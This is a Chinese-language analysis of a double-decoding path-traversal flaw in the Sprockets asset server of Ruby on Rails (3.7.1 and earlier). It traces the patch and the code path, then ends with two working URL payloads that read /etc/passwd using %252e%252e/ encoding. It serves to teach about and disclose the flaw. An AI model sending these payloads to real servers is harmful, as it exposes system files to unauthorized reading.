漏洞背景

Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。


漏洞原理

Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。


漏洞分析

一、首先分析下官方给出的补丁：

？代表nullable，可空类型。

1.过滤路径中的..  2.限制绝对路径在路径列表中  3.过滤路径中的://

path.include?("..") || absolute_path?(path) || path.include?("://")


二、接下来分析下漏洞存在的位置：

1.第一步里过滤的语句是在 forbidden_request函数中，forbidden_request函数在call函数中被调用。

if forbidden_request?(path)    return forbidden_response(env)end

2.返回 forbidden_response(env)信息之后会进入 find_asset里。

asset = find_asset(path)

3.跟入 find_asset里查看。此时传入的uri自动被url-decode一次。

def find_asset(*args)    uri, _ = resolve(*args)    if uri        load(uri)    endend

4.继续跟入load()

def load(uri)    unloaded = UnloadedAsset.new(uri, self)    if unloaded.params.key?(:id)        unless asset = asset_from_cache(unloaded.asset_key)        ......end

5.跟入UnloadedAsset.new()，在其中可以看到访问filename时会调用load_file_params

class UnloadedAsset    def initialize(uri, env)        @uri             =    uri.to_s        @env             =    env            @compressed_path =    URITar.new(uri, env).compressed_path        @params          =    nil        @filename        =    nilendattr_reader :compressed_path, :uri...def    filename    unless    @filename        load_file_params    end        @filenameend

6.跟进load_file_params

def    load_file_params
    @filename, @params = URIUtils.parse_asset_uri(uri)
end

7.跟入URIUtils找到parse_asset_uri()

8.跟入split_file_uri()，第三行代码进行了第2次解码（unescape）

9.load_from_unloaded函数主要功能是检查文件是否存在和文件是否在指定路径下。

...load_path, logical_path = paths_split(config[:paths], path_to_split)...

10.跟入paths_split()

11.跟入split_subpath()。

如果以path开头，则检查通过，回到 load_from_unloaded进行后续读取操作。

def   split_subpath(path, subpath)    return "" if path == subpath    path = File.join(path, ''.freeze)    if subpath.start_with?(path)        subpath[path.length..-1]    else        nil    endend

12.上述判断本无问题，只是在这一系列调用过程中，开发者不知不觉将传入的路径进行了二次解码，这才让攻击者有机可乘。


漏洞复现

我们可以利用%252e%252e/%252e%252e/即../../的二次url编码来穿越到根目录达到读取任意文件的目的。


1.首先正常读取该文件，报错并返回了可访问目录。

Payload:

/assets/file:%2f%2f/etc/passwd



2.利用可访问目录进行跨目录遍历文件，使用../../的办法向上跳转，最后读取/etc/passwd，Payload里向上跳转了6次。

注意 ../需要进行2次编码即%252e%252e/

Payload:

/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
